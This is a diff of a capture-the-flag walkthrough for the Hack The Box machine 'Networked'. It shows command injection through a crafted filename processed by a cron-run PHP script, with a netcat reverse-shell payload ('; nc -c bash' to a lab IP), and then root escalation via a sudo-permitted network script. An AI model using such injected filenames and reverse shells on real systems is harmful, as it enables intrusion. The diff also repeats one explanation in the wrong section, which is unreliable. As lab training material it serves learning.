@@ -256,7 +256,7 @@ I examined some interesting files, and here's what I found:
 ```Diff
 <?php
 require '/var/www/html/lib.php';
-$path = '/var/www/html/uploads/';
+- $path = '/var/www/html/uploads/';
 $logpath = '/tmp/attack.log';
 $to = 'guly';
 $msg= '';
@@ -291,20 +291,79 @@ foreach ($files as $key => $value) {
 ?>
 ```
 
-* **Command Injection:** The script insecurely concatenates the $value variable (filename) directly into a system command without any sanitization, allowing an attacker to execute arbitrary commands by crafting a malicious filename.
+* **Command Injection:** The script insecurely concatenates the `$value` variable (filename) directly into a `exec()` function without any sanitization, allowing me to execute arbitrary commands by crafting a malicious filename.
+
+  ✔  Normal filename example: `file.txt` will be executed as `nohup /bin/rm -f /var/www/html/uploads/file.txt`
+
+  ❌ Malicious filename example: `; nc -c bash 10.10.14.34 9999 ;` will be executed as `nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.14.34 9999 ;`
+
+  (use a semicolon (;) to end the original delete command and begin our own).
 
 
 
-Found a cronjob running a script named check_attack.php every 3 minutes.
+📑 `crontab.guly`
 
-Vulnerability: Command Injection via filename in exec() function.
+```Diff
+- */3 * * * * php /home/guly/check_attack.php
+```
+* **Cronjob:** The system includes a scheduled task (Cronjob) that runs with the privileges of the user guly and executes the `check_attack.php` script every [3 minutes](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/crontab-2.png) to check the uploads folder. I can exploit this to escalate my privileges to be user guly!
 
-Action: Created a file with a semicolon in its name to trigger the injection.
 
-Root
-Checked sudo permissions: sudo -l.
+So, let's open a listener on port 9999, then go back to `/var/www/html/uploads` and create my reverse shell command as a filename which will then automatically run after 3 minutes as a cron job and become guly!!💀
 
-Binary: /usr/local/sbin/changename.sh
+```bash
+cd /var/www/html/uploads
+
+touch "; nc -c bash 10.10.14.34 9999" 
+```
+
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/10-exp.png)
+
+Grab a sip of coffee and chill for a 3 minutes☕..
+
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/11-guly.png)
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/12-guly-flag.png)
+
+
+Here we go ! I'm guly user and got the flag, lets countinue
+
+---
+
+## 👑 4: Privilege Escalation (root)
+
+Current User: guly
+
+Target User: root
+
+As seen above, I checke guly permissions with `sudo -l`, and notice the binary `/usr/local/sbin/changename.sh` that can be run with root privs without a password.
+So, let's see what's inside:
+
+📑 `changename.sh`
+
+```Diff
+- #!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+- regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+-        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+- /sbin/ifup guly0
+```
+* **Cronjob:** The system includes a scheduled task (Cronjob) that runs with the privileges of the user guly and executes the `check_attack.php` script every [3 minutes](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/crontab-2.png) to check the uploads folder. I can exploit this to escalate my privileges to be user guly!
 
 Exploit: Injected /bin/bash through the BOOTPROTO variable.
 
